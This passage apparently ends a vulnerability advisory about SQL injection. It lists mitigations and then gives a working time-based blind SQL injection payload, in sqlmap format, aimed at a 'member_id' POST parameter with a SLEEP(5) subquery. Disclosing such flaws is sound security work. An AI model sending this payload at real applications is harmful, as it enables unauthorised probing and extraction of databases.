**Mitigation or fix:**

*   Use prepared statements and parameter binding.
*   Implement strict input validation and filtering.
*   Minimize database user permissions.
*   Conduct regular security audits.

**Payload Example:**

```
Parameter: member_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=&member_id=1' AND (SELECT 5044 FROM (SELECT(SLEEP(5)))sXOg) AND 'cEBE'='cEBE&lastname=1&firstname=1&middlename=1&email=1&contact=1&gender=Female&address=1
